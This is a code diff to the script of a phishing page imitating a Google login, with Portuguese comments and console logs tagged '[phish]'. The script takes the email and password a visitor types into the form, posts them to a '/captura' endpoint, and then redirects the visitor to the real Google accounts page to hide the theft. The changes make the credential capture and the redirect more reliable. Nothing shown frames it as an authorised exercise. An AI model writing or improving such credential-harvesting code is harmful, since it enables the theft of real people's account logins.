@@ -125,20 +125,32 @@
   </div>
 
 <script>
+  console.log('[phish] script carregado');
+  var redirected = false;
+  function goGoogle() {
+    if (redirected) return;
+    redirected = true;
+    window.location.href = 'https://accounts.google.com/';
+  }
+
   document.getElementById('phish-form').addEventListener('submit', function(e) {
     e.preventDefault();
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
-    fetch('/captura
-', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({ email, password })
-    }).finally(() => {
-      window.location.href = 'https://accounts.google.com/';
-    });
+    var email = document.getElementById('email').value;
+    var password = document.getElementById('password').value;
+    // Timeout de seguranca: redireciona em 4s mesmo se o fetch travar
+    console.log('[phish] submit capturado, enviando...');
+    setTimeout(goGoogle, 4000);
+    try {
+      fetch('/captura', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ email: email, password: password })
+      }).then(function(r){ console.log('[phish] resposta:', r.status); goGoogle(); })
+        .catch(function(err){ console.log('[phish] erro no fetch:', err); goGoogle(); });
+    } catch (err) {
+      goGoogle();
+    }
   });
 </script>
 </body>
 </html>
-
